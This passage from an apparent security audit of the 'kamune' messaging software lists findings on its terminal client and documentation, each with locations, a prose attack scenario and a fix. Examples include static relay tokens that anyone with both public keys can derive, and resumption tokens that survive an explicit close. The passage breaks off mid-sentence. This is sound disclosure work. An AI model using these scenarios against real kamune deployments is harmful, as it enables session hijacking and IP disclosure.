**Recommendation.** Use `term.ReadPassword(int(os.Stdin.Fd()))`.

#### TUI-14

**Server listen errors are discarded; the UI shows 'Listening on' forever after a bind failure**

Severity: Low · Category: correctness

Locations: `cmd/tui/server.go:25-27`, `server.go:82-86`, `cmd/tui/welcome.go:214`

kamune.NewServer does not bind. ListenAndServe binds and returns the net.Listen error (server.go:82-86). The TUI runs it in a goroutine and drops the return value (cmd/tui/server.go:25-27). An address in use or a permission error is never shown, and the connecting screen keeps saying 'Listening on :9000'.

**Attack scenario.** A local process holds the port (or the user picks a port below 1024). The user waits for peers that can never connect, or a peer connects to whatever else owns the port.

**Recommendation.** Bind in serve() with kamune.ServeWithTCP (which listens in NewServer) so errors return synchronously, or send ListenAndServe's error back as connectFailedMsg.

#### TUI-15

**TUI renders and stores SessionData frames as chat messages; bus sends one on every session**

Severity: Low · Category: correctness

Locations: `cmd/tui/tea.go:527-564`, `cmd/tui/tea.go:621-638`, `cmd/bus/network.go:684`, `cmd/bus/network.go:918`, `cmd/daemon/network.go:997`, `pkg/relayconn/token.go:154-159`

The TUI receive loop handles only Ping and Pong. RouteSessionData frames are unmarshalled into BytesValue, so field 1 holds the raw map entry `0a 0b 'ecdh_pubkey' 12 20 <32 key bytes>`. The loop renders that as a peer message and handleChatMessage stores it in chat history. Bus (network.go:684, 918) and the daemon (network.go:997) send this frame on every non-incognito session. Every bus-to-TUI or daemon-to-TUI session therefore shows and stores a garbage line that contains control bytes.

**Attack scenario.** A bus user connects to a TUI user. Right after the handshake, the TUI shows a 'Peer:' message containing binary and control characters and writes it to chat history. A malicious peer can inject arbitrary bytes the same way through RouteSessionData, though it can already do that through normal messages.

**Recommendation.** In startReceiving, use ReceivePayload and switch on metadata.Route(). Handle or ignore RouteSessionData, and treat only RouteExchangeMessages as chat.

#### TUI-16

**Default slog handler writes to stderr over the Bubble Tea screen; unauthenticated connections can trigger it**

Severity: Low · Category: ux-safety

Locations: `cmd/tui/main.go:67-68`, `server.go:104-107`, `dial.go:140-144`, `server.go:228-232`, `cmd/tui/tea.go:333`

main.go never configures slog, so core and TUI log calls go to stderr on the same terminal Bubble Tea draws on, outside the renderer. Any failed inbound handshake logs 'serve conn' (server.go:105). Successful handshakes log 'session established' with the peer name (dial.go:140, server.go:228). slog's text quoting escapes control characters, so this is screen corruption rather than escape injection.

**Attack scenario.** An unauthenticated client repeatedly opens and drops connections to the TUI server. Each attempt prints a log line into the middle of the UI, which can push the verify prompt or chat lines around and hide content until the next full redraw.

**Recommendation.** At startup, point slog at a file under the config directory or at io.Discard (or use tea.LogToFile), and show important events through model messages.

#### TUI-17

**Empty passphrase is accepted silently and new databases are created without confirmation**

Severity: Low · Category: ux-safety

Locations: `cmd/tui/main.go:43`, `cmd/tui/main.go:52`, `cmd/tui/main.go:55`, `cmd/tui/main.go:57`

The TUI reads the passphrase with term.ReadPassword and passes it through unchanged. If the user presses Enter, pass is "" and is passed to OpenStorage. This is the same as WithNoPassphrase (pkg/storage/storage.go:555-557), the mode SPEC 11.2 says collapses the key hierarchy and SHOULD NOT be used where the file may be exposed. The TUI shows no warning. When the DB path does not exist yet, the first passphrase creates it with no confirmation prompt, so a typo locks the user out of the new identity. No passphrase-change API exists, so an empty passphrase cannot be fixed later.

**Attack scenario.** A user hits Enter at 'Passphrase:' on first launch, expecting to set one later. The identity key and chat history are written to a DB that anyone who copies the file (stolen-disk attacker A6) can decrypt.

**Recommendation.** Reject an empty passphrase unless an explicit flag or confirmation allows it, as the bus 'Use without password' button does. Ask for the passphrase twice when the DB file does not exist.

#### TUI-18

**Verify prompt accepts on Enter; the advertised [Esc] Back key does nothing**

Severity: Low · Category: ux-safety

Locations: `cmd/tui/welcome.go:235`, `cmd/tui/welcome.go:237`, `cmd/tui/welcome.go:247`, `cmd/tui/welcome.go:289`

updateVerify treats Enter as acceptance (welcome.go:237), although the prompt only lists '[Y] Accept'. The reject branch tests `msg.Type == tea.KeyEsc`, but it sits inside `case tea.KeyEnter, tea.KeyRunes:` (welcome.go:235), so Esc never reaches it. The user is told Esc goes back, but it has no effect.

**Attack scenario.** A user who has just pressed Enter to start the connection, or presses Enter twice, approves an unknown peer as soon as the prompt appears, without reading the fingerprint. A user who presses Esc expecting to back out stays on the prompt.

**Recommendation.** Accept only on an explicit 'y'/'Y'. Add tea.KeyEsc to the case list and handle it as reject. Consider ignoring key input for a short time after the prompt appears.

#### TUI-19

**Server-mode exit closes the socket before RouteCloseTransport; resumption tokens survive explicit close**

Severity: Low · Category: spec-drift

Locations: `cmd/tui/server.go:14-17`, `cmd/tui/tea.go:663`, `cmd/tui/tea.go:671`, `server.go:141`, `transport.go:177-181`

In direct-serve mode, cleanup first closes doneCh (tea.go:663-665). That releases the server handler (cmd/tui/server.go:16), and core serve() then closes the raw conn in its defer (server.go:141). Only afterwards does cleanup call transport.Close (tea.go:671). Its Send of RouteCloseTransport fails on the closed conn, so Close skips invalidateResumptionTokens (transport.go:178-181). The peer sees an abrupt ErrConnClosed instead of ErrPeerDisconnected, so it does not invalidate its tokens either. SPEC 6.6 says tokens are invalidated on explicit close. Combined with the dial-mode deadlock, no TUI exit path performs a graceful close.

**Attack scenario.** Trigger: the user ends a served chat with Esc. The 20 resumption tokens stay in the DB on both sides for up to 24 h. Anyone who later obtains the DB and passphrase in that window can resume the session (RFC001 section 10 exposure), although the user ended it explicitly.

**Recommendation.** In cleanup, call transport.Close before closing doneCh, or have the server handler own the transport and call Close itself before returning.

#### TUI-20

**Session countdown is shown only in relay-serve mode and starts at chat entry, not at relay registration**

Severity: Info · Category: correctness

Locations: `cmd/tui/tea.go:188`, `cmd/tui/tea.go:424`, `cmd/relay/internal/services/session.go:132`

In relay-dial mode the TTL from DialRelay is stored at tea.go:188-190, but enterChat sets sessionExpiry only when m.mode == modeRelayServe (tea.go:424), so the dialer never shows a countdown. In relay-serve mode, expiry is now+TTL at chat entry. The relay starts the paired-session lifetime at Join (services/session.go:132-133), so the UI overstates the time left by the handshake and verify-prompt duration, not by the time spent waiting for the peer.

**Recommendation.** Record the registration time when relayReadyMsg or connectedMsg arrives, and set expiry for both relay modes.

#### TUI-21

**TUI minor-version warning cannot fire for 0.x because core rejects pre-1.0 minor mismatches**

Severity: Info · Category: correctness

Locations: `cmd/tui/version.go:26`, `cmd/tui/version.go:38`, `version.go:67`

checkMinorMismatch warns when the major versions match and the minor versions differ. For AppVersion 0.7.0, core checkVersion rejects any pre-1.0 minor difference during the handshake (version.go:67-71), so a connected peer always has the same minor version and the warning is dead code.

**Recommendation.** Remove the duplicate check or base it on the core policy.

#### TUI-22

**Several TUI tests re-implement the logic under test instead of calling it**

Severity: Info · Category: test-gap

Locations: `cmd/tui/tea_test.go:51`, `cmd/tui/tea_test.go:66`, `cmd/tui/tea_test.go:113`, `cmd/tui/tea_test.go:127`

TestEnterChat_SetsExpiryForRelayServe, TestEnterChat_NoExpiryForDirectMode, TestUpdate_ConnectedSetsSessionTTL and TestUpdate_ConnectedPreservesExistingTTL copy the if-statement from enterChat and Update into the test body and assert on that copy, so they pass whatever the production code does. No test covers the verifier, keepalive, cleanup ordering, sanitization or concurrency, which is where the defects above are.

**Recommendation.** Call m.Update(connectedMsg{...}) and enterChat with a real transport pair, as in a loopback server/dial test. Add tests for Esc in dial and serve modes, for dropped verify requests, and for escape-sequence stripping.

### docs

README.md, AGENTS.md, docs/, module READMEs and the daemon JSON schemas. Documentation errors with a security effect are filed under the code module instead.

| ID                | Severity | Category   | Finding                                                                                                                   |
| ----------------- | -------- | ---------- | ------------------------------------------------------------------------------------------------------------------------- |
| [DOC-01](#doc-01) | Medium   | spec-drift | DAEMON.md says static relay/P2P tokens are ECDH-derived and peer-exclusive; they are SHA-256 of both public keys          |
| [DOC-02](#doc-02) | Low      | spec-drift | RELAY.md says the broker echoes the claimed IP:port from REGISTER; the broker forwards the observed source address        |
| [DOC-03](#doc-03) | Low      | docs       | SPEC 11.2 overstates at-rest protection: wrong salt count, wrong no-passphrase wording, plaintext keys not mentioned      |
| [DOC-04](#doc-04) | Info     | spec-drift | SPEC 11.3 storage table is wrong: remote key not initiator key, relay tokens and settings missing, LastSeen never updated |
| [DOC-05](#doc-05) | Info     | spec-drift | SPEC 9.2 claims KCP Reed-Solomon FEC, but every KCP call site passes 0 data and 0 parity shards                           |
| [DOC-06](#doc-06) | Info     | docs       | AGENTS.md and module READMEs give build and run commands that fail, and other tooling drift                               |
| [DOC-07](#doc-07) | Info     | docs       | AGENTS.md and README name packages and files that do not exist                                                            |
| [DOC-08](#doc-08) | Info     | docs       | DAEMON.md and the JSON schemas disagree with the daemon on counts, fields, required params, persistence and events        |
| [DOC-09](#doc-09) | Info     | docs       | DAEMON.md open_storage example puts an unencrypted DB in /tmp                                                             |
| [DOC-10](#doc-10) | Info     | docs       | DAEMON.md P2P examples use wss:// broker addresses, a wrong p2p token schema and a wrong transport table                  |
| [DOC-11](#doc-11) | Info     | docs       | README cipher suite name omits HKDF-SHA512 and draft RFCs target the current version                                      |
| [DOC-12](#doc-12) | Info     | docs       | README says KAMUNE_DB_PATH overrides the DB path, but the daemon requires storage_path, so the variable is never used     |
| [DOC-13](#doc-13) | Info     | docs       | RELAY.md configuration reference, defaults and reliability statement do not match the relay code                          |
| [DOC-14](#doc-14) | Info     | docs       | RELAY.md TLS claims do not match code: TLS 1.2 accepted, and missing cert files fail instead of auto-generating           |
| [DOC-15](#doc-15) | Info     | docs       | SPEC and enigma claim the base32 alphabet excludes O and I; it includes both                                              |
| [DOC-16](#doc-16) | Info     | docs       | SPEC and RFC001 describe resumption and teardown behaviour that the core does not have                                    |
| [DOC-17](#doc-17) | Info     | docs       | TUI README says the mouse wheel scrolls chat and history, but mouse reporting is never enabled                            |

#### DOC-01

**DAEMON.md says static relay/P2P tokens are ECDH-derived and peer-exclusive; they are SHA-256 of both public keys**

Severity: Medium · Category: spec-drift

Locations: `docs/DAEMON.md:562-564`, `docs/DAEMON.md:685-687`, `cmd/daemon/network.go:1277-1306`, `cmd/daemon/p2p.go:189-215`, `pkg/relayconn/token.go:125-137`, `cmd/relay/internal/broker/broker.go:224-261`

DAEMON.md:562-564 says that with peer_pub_b64 set, generate_relay_token derives a static token via ECDH so only that peer can connect, and DAEMON.md:686 repeats the claim for P2P. The code comment at network.go:1278-1279 says the same. deriveP2PToken calls relayconn.TokenFromKeys (p2p.go:210), which returns SHA256(min(A,B)||max(A,B)) of the two Ed25519 public keys (token.go:125-137). There is no ECDH and no secret input; anyone who knows both keys (share cards, Introduce) computes the same token. The relay and broker do not check who joins, and on the broker any REGISTER with that token from a different X25519 key gets the listener's IP:port. RELAY.md describes static tokens correctly as not secret.

**Attack scenario.** An integrator trusts DAEMON.md and leaves verification on Auto-Accept or Quick for a 'private' static relay token. A third party who knows both public keys sends Register{MODE_JOIN, T} and reaches the kamune handshake, or registers MODE_CREATE first so the relay returns ErrTokenInUse to the legitimate listener. On the broker, the third party learns the listener's public IP and port.

**Recommendation.** Correct DAEMON.md and the code comment: static tokens are a public-key hash, computable by anyone with both keys, providing routing only; the verifier is the only access control. Link to RELAY.md's static-token notes. If the 'only that peer' property is wanted, derive static tokens from a shared secret.

<details><summary>Evidence</summary>

```text
DAEMON.md:563-564: '... derives a deterministic (static) token via ECDH ... only that peer can connect using it.'
DAEMON.md:686: '... the token is derived via ECDH so only that peer can match.'
p2p.go:210: t, err := relayconn.TokenFromKeys(myPubRaw, peerPubRaw)
token.go:133-136: h := sha256.New(); h.Write(lo); h.Write(hi); return h.Sum(nil), nil
```

</details>

#### DOC-02

**RELAY.md says the broker echoes the claimed IP:port from REGISTER; the broker forwards the observed source address**

Severity: Low · Category: spec-drift

Locations: `cmd/relay/internal/broker/broker.go:171-177`, `cmd/relay/internal/broker/broker.go:282-295`, `docs/RELAY.md:669-671`, `docs/RELAY.md:724-725`, `docs/RELAY.md:840-841`, `pkg/relayconn/broker/client.go:117-140` and 15 more

RELAY.md:670, 724-725, 821, 840 and the Client.Register doc comment (client.go:117-119) say the broker echoes the REGISTER IP/PORT to the matched peer. broker.go:174-177 only checks they are non-zero; broker.go:184 stores ipv4FromAddr(src) and sendPeerMatched (broker.go:287-294) forwards held.addr and newAddr. The static-token text in RELAY.md:765 is correct on the wire: TokenFromKeys returns 32 bytes (token.go:136) and BuildRegister silently truncates to 16 (codec.go:162, tokenSize=16). The drift there is in the Go API contract, not the wire doc.

**Attack scenario.** No direct attack. Implementers who follow RELAY.md and put the punch socket's address in IP/PORT while sending REGISTER from another socket get matched to the wrong port, and hole-punching fails.

**Recommendation.** Update RELAY.md and the Register comment to say the observed source address is used and the IP/PORT fields are only a sanity check (or remove them in v2). Align the token length text with the code once the token-size bug is fixed.

#### DOC-03

**SPEC 11.2 overstates at-rest protection: wrong salt count, wrong no-passphrase wording, plaintext keys not mentioned**

Severity: Low · Category: docs

Locations: `docs/SPEC.md:1268-1269`, `docs/SPEC.md:1271-1275`, `docs/SPEC.md:1277-1285`, `internal/engine/bolt_store.go:17-20`, `internal/engine/bolt_store.go:141`, `internal/engine/bolt_store.go:173` and 4 more

SPEC 11.2 (SPEC.md:1268) says "The four salts" but lists three. The code has three salts (internal/engine/bolt_store.go:17-20), not pkg/storage/bolt_store.go. In no-passphrase mode, WithNoPassphrase (storage.go:555-558) feeds an empty passphrase into the same HKDF with a random salt stored in plaintext. The effect matches the SPEC's "fixed derivation", but the mechanism differs. SPEC 11.2 and 11.3 do not say that bucket and key names are plaintext. A stolen-disk attacker can read session IDs (session.go:64), the local timestamp and sender direction of every chat message (storage.go:518-519), and settings key names. SPEC 11 also gives no warning that the passphrase KDF is plain HKDF (enigma.go:69) with no work factor.

**Attack scenario.** No direct attack. Readers sizing their threat model trust SPEC 11 and choose short passphrases.

**Recommendation.** Correct the salt count and the no-passphrase wording. Add a 'What is not encrypted' list and a note on the KDF cost.

#### DOC-04

**SPEC 11.3 storage table is wrong: remote key not initiator key, relay tokens and settings missing, LastSeen never updated**

Severity: Info · Category: spec-drift

Locations: `docs/SPEC.md:1282`, `docs/SPEC.md:1285`, `transport.go:226-228`, `dial.go:137`, `pkg/storage/session.go:45`, `pkg/storage/storage.go:427-478` and 3 more

SPEC 11.3 says resumption state holds 'the initiator's public key'. persistEstablishedSession stores t.remotePeer.PublicKey on both sides, so the dialer stores the responder's key. The table omits the relay_tokens meta key (RelayTokensKey), the settings namespace (app:key values) and the identity's location. It lists a peer 'last-seen time', but UpdatePeerLastSeen has no callers, so LastSeen always equals the value set at StorePeer, and the bus peer list sort by LastSeen has no meaning.

**Recommendation.** Update SPEC 11.3 to list every bucket and meta key and to say the remote peer key is stored. Either call UpdatePeerLastSeen on session establishment or drop LastSeen from the spec and UI.

#### DOC-05

**SPEC 9.2 claims KCP Reed-Solomon FEC, but every KCP call site passes 0 data and 0 parity shards**

Severity: Info · Category: spec-drift

Locations: `docs/SPEC.md:1119-1120`, `dial.go:268`, `server.go:404`, `cmd/bus/p2plistener.go:132`, `cmd/bus/directp2p.go:59`, `cmd/bus/directp2p.go:154` and 5 more

SPEC 9.2 says 'KCP provides ARQ for reliability, Reed-Solomon forward error correction, and congestion control.' DialWithUDP and ServeWithUDP call kcp.Dial(addr) and kcp.Listen(addr). In kcp-go v5.6.72 these are DialWithOptions(raddr, nil, 0, 0) and ListenWithOptions(laddr, nil, 0, 0): no block cipher, 0 data shards and 0 parity shards. The bus and daemon P2P paths call kcp.ServeConn(nil, 0, 0, conn) and NewConn4(..., nil, 0, 0, ...). FEC is never enabled. Security is unchanged because kamune encrypts frames itself, but the documented loss-recovery behavior does not exist.

**Recommendation.** Remove the FEC claim from SPEC 9.2, or pass dataShards and parityShards (for example 10 and 3) in all KCP constructors.

#### DOC-06

**AGENTS.md and module READMEs give build and run commands that fail, and other tooling drift**

Severity: Info · Category: docs

Locations: `AGENTS.md:19`, `AGENTS.md:27-28`, `AGENTS.md:55`, `AGENTS.md:76`, `cmd/tui/README.md:9-11`, `cmd/relay/README.md:166` and 4 more

AGENTS.md:27-28 ('go run ./cmd/relay', 'go build -o daemon ./cmd/daemon' from root) and cmd/tui/README.md:10 ('go run ./cmd/tui') fail because those directories are separate modules and there is no go.work. AGENTS.md:55 lists internal/store; the package is internal/engine. AGENTS.md:19 omits cmd/daemon from the test list. cmd/relay/README.md:166 allows assert, which AGENTS.md:76 forbids. cmd/bus/frontend imports gitignored generated bindings. The bus README's 'npm install && npm run dev' path (README.md:82-90) fails without 'wails3 generate bindings'. wails3 build/dev generate them through build:frontend -> generate:bindings. build:docker references a missing build/docker/Dockerfile.server, but a precondition at Taskfile.yml:306-307 stops it with 'Run wails3 update build-assets'.

**Recommendation.** Use 'cd cmd/daemon && go build -o daemon .' and 'cd cmd/relay && go run . -c &lt;path&gt;' (or make targets), fix the TUI README, rename internal/store to internal/engine, add cmd/daemon to the test list, align the relay README with the require-only rule, document `wails3 generate bindings` before frontend checks, and remove or fix the build:docker task.

#### DOC-07

**AGENTS.md and README name packages and files that do not exist**

Severity: Info · Category: docs

Locations: `AGENTS.md:55`, `AGENTS.md:70`, `README.md:35`, `errors.go:5-39`, `cmd/relay/internal/handlers/router.go:66`

AGENTS.md:55 lists `internal/store`, but the package is `internal/engine`. AGENTS.md:70 says sentinels live in `transport.go` and `router.go`. transport.go has none, and all root sentinels are in errors.go:5-39. The only router.go is cmd/relay/internal/handlers/router.go, which holds clientIP and no sentinels. README.md:35 says the root module includes a 'router'. The root only has routes.go, a Route enum.

**Recommendation.** Replace internal/store with internal/engine, point the sentinel convention at errors.go, and drop 'router' from README.md.

#### DOC-08

**DAEMON.md and the JSON schemas disagree with the daemon on counts, fields, required params, persistence and events**

Severity: Info · Category: docs

Locations: `docs/DAEMON.md:72`, `cmd/daemon/schema/README.md:48`, `docs/DAEMON.md:774`, `docs/DAEMON.md:822`, `docs/DAEMON.md:1031`, `docs/DAEMON.md:1363` and 16 more

Same as the original, with one fix to (4). The dial schema and start_server schema both require addr. The dial examples for relay, p2p and direct-p2p omit addr, and so does the start_server relay example. The start_server p2p and direct-p2p examples include "addr": "0.0.0.0:0". The daemon ignores or overwrites addr for those transports (cmd/daemon/network.go:146,613,653,665).

**Recommendation.** Regenerate DAEMON.md and schema descriptions from the Go structs, add the missing events and fields, fix counts, make addr conditional on transport, correct the fingerprint persistence note, and add a test that compares the CMD/Evt constants with schema file names and DAEMON.md headings.

#### DOC-09

**DAEMON.md open_storage example puts an unencrypted DB in /tmp**

Severity: Info · Category: docs

Locations: `docs/DAEMON.md:107`

The open_storage example uses storage_path /tmp/kamune.db with db_no_passphrase: true. That puts an unencrypted DB in a world-writable directory, where on systems without protected_regular another user can create the file first.

**Recommendation.** Change the example path to a per-user directory and drop db_no_passphrase from it.

#### DOC-10

**DAEMON.md P2P examples use wss:// broker addresses, a wrong p2p token schema and a wrong transport table**

Severity: Info · Category: docs

Locations: `docs/DAEMON.md:201`, `docs/DAEMON.md:391-392`, `docs/DAEMON.md:696-697`, `docs/DAEMON.md:711`, `docs/DAEMON.md:755-765`, `docs/DAEMON.md:1804-1813` and 5 more

The broker is UDP and the daemon resolves broker_addr with net.ResolveUDPAddr("udp4", brokerAddr), but every example uses "wss://broker.example.com", which fails to resolve. The list_p2p_tokens and p2p_tokens examples show fields nonce, pub, peer and broker_addr. The p2pToken struct serializes token, consumed, ttl_ns, expires_at, mode and peer_pub_b64, and brokerAddr is json:"-". The Transports table says the p2p server uses ServeWithUDP, but the code uses ServeWithListener(p2pListener).

**Recommendation.** Use host:port UDP examples (for example broker.example.com:4788), document the actual p2pToken JSON fields, and fix the Transports table.

#### DOC-11

**README cipher suite name omits HKDF-SHA512 and draft RFCs target the current version**

Severity: Info · Category: docs

Locations: `README.md:9`, `README.md:57`, `docs/rfc/RFC004_double-ratchet.md:5`, `docs/rfc/RFC005_message-fragmentation.md:5`

The README cipher suite 'Ed25519_MLKEM768_ChaCha20-Poly1305X' omits HKDF-SHA512, which SPEC 3 and AGENTS.md include. The README describes three protocol phases where SPEC has five. RFC004 and RFC005 are drafts that still target v0.7.0, which is already the current version (version.go). The newest CHANGELOG entry is v0.6.0.

**Recommendation.** Use the full suite name 'Ed25519_MLKEM768_HKDF-SHA512_ChaCha20-Poly1305X' in the README, align the phase description with SPEC, and retarget the draft RFCs.

#### DOC-12

**README says KAMUNE_DB_PATH overrides the DB path, but the daemon requires storage_path, so the variable is never used**

Severity: Info · Category: docs

Locations: `cmd/daemon/README.md:57`, `cmd/daemon/daemon.go:564-567`, `cmd/daemon/daemon.go:325-328`, `cmd/daemon/daemon.go:611-612`, `pkg/storage/storage.go:101-111`

The README lists KAMUNE_DB_PATH as an override 'used when the storage is opened with storage.WithDBPath'. In fact storage reads KAMUNE_DB_PATH only when no path is supplied, and handleOpenStorage rejects an empty storage_path. The daemon therefore always passes an explicit path, and the variable has no effect.

**Recommendation.** Remove the variable from the daemon README, or let open_storage fall back to KAMUNE_DB_PATH when storage_path is empty.

#### DOC-13

**RELAY.md configuration reference, defaults and reliability statement do not match the relay code**

Severity: Info · Category: docs

Locations: `docs/RELAY.md:230-231`, `docs/RELAY.md:880-916`, `docs/RELAY.md:920-931`, `docs/RELAY.md:935-945`, `docs/RELAY.md:962-977`, `docs/RELAY.md:993-1006` and 7 more

(1) [server] address, expose_health, expose_ip and [rate_limit] enabled do not exist. Config has [diagnose], per-transport addresses, [wss], trusted_proxies and rate_limit.disabled. BurntSushi toml ignores unknown keys, so these are silently dropped. (2) There is no /ip route. EchoIPHandler is defined but never registered, and /health is only on the diagnose server. (3) Documented defaults token_ttl 5m, session_ttl 30m, max_concurrent_sessions 10000 and max_message_size 65536 are not code defaults. config.New sets none of them, so omitted values are 0 (rejected or no limit). assets/config.toml uses 10m and 60m. (4) rate_limit max_entries defaults to 100000, not max_concurrent_sessions. (5) The broker sample has 'enabled = false' on 127.0.0.1, while the shipped config enables it on 0.0.0.0:4788. (6) RELAY.md:230 says the kamune layer handles 'reliability, ordering, and retransmission', but SPEC 9.4 and RFC003 say kamune has no retransmission and any gap is fatal.

**Recommendation.** Regenerate the RELAY.md configuration reference from config.go and assets/config.toml, and fix the /ip text and the reliability statement.

#### DOC-14

**RELAY.md TLS claims do not match code: TLS 1.2 accepted, and missing cert files fail instead of auto-generating**

Severity: Info · Category: docs

Locations: `docs/RELAY.md:340-347`, `docs/RELAY.md:896-897`, `cmd/relay/run/run.go:225-239`

RELAY.md says the TLS listener is 'wrapped in a TLS 1.3 connection'. loadTLSConfig sets no MinVersion, so Go's server default (TLS 1.2 minimum) applies. RELAY.md also says a cert is auto-generated when configured files are missing. The code generates an in-memory certificate only when both paths are empty and returns an error when a configured file is missing. This matches cmd/relay/README.md but not RELAY.md.

**Recommendation.** Set MinVersion: tls.VersionTLS13 in loadTLSConfig if 1.3 is intended, and correct RELAY.md lines 345-347 and 896-897.

#### DOC-15

**SPEC and enigma claim the base32 alphabet excludes O and I; it includes both**

Severity: Info · Category: docs

Locations: `docs/SPEC.md:1397`, `internal/enigma/enigma.go:19`, `internal/enigma/enigma.go:77-79`

The alphabet ABCDEFGHIJKLMNOPQRSTUVWXYZ234567 contains O and I. It excludes 0, 1, 8 and 9. SPEC 13 and the enigma.Text comment say it 'excludes 0/O/1/I'. Session IDs shown to users can contain O and I. The mapping src[i]%32 over a byte has no bias (256/32 = 8).

**Recommendation.** Correct the SPEC row and the comment, or switch to an alphabet without O and I. Changing the alphabet also requires updating validateHandshakeFields (handshake.go:329-334).

#### DOC-16

**SPEC and RFC001 describe resumption and teardown behaviour that the core does not have**

Severity: Info · Category: docs

Locations: `docs/SPEC.md:484-488`, `docs/SPEC.md:288-291`, `docs/SPEC.md:886`, `docs/rfc/RFC001_session-resumption.md:237-238`, `docs/rfc/RFC001_session-resumption.md:244-250`, `kamune.go:77` and 8 more

Same four points as the original, with one correction: the RemoteVerifier type is at kamune.go:77, not kamune.go:398. RFC001 line 237 also claims that token plus session ID 'authorize establishing a transport', which the signature check at server.go:266-273 contradicts. The DB+passphrase scenario at RFC001:245-246 still works when the stolen DB belongs to the impersonated peer, because that DB holds its identity key. The RFC's 'one-directional eavesdropping' understates that case.

**Recommendation.** Rewrite SPEC 6.2 to say the verifier is supplied by the application. State that the caller closes the transport after ErrPeerDisconnected. Document that the wire reason is generic on purpose. Correct RFC001 section 10 to say a stolen token is useful only together with the initiator's identity key.

#### DOC-17

**TUI README says the mouse wheel scrolls chat and history, but mouse reporting is never enabled**

Severity: Info · Category: docs

Locations: `cmd/tui/README.md:35`, `cmd/tui/main.go:68`, `cmd/tui/tea.go:253`, `cmd/tui/tea.go:461`

tea.NewProgram(m) is created without tea.WithMouseCellMotion or tea.WithMouseAllMotion. Bubble Tea therefore emits no mouse events, and viewport.MouseWheelEnabled has no effect.

**Recommendation.** Add tea.WithMouseCellMotion() to NewProgram, or remove the claim from the README.

## Appendix: rejected claim

Verification refuted one claim. It is listed so it is not filed again.

| Claim                                                                                                | Location                     | Reason it was rejected                                                                                                                                                                                                                                                                                                                                                                                          |
| ---------------------------------------------------------------------------------------------------- | ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| FindSessionByPeer returns the lowest-ID session, not the newest; daemon stores the relay token there | `pkg/storage/storage.go:290` | The first-match behaviour of FindSessionByPeer is real. However, its only caller, deriveAndStoreRelayTokensForPeers, is never called anywhere in the repo, so the daemon never writes a derived token to the wrong session and reconnection is not affected. What remains is an exported pkg/storage API that returns an arbitrary matching session and does not document that. That is a code-quality item for |
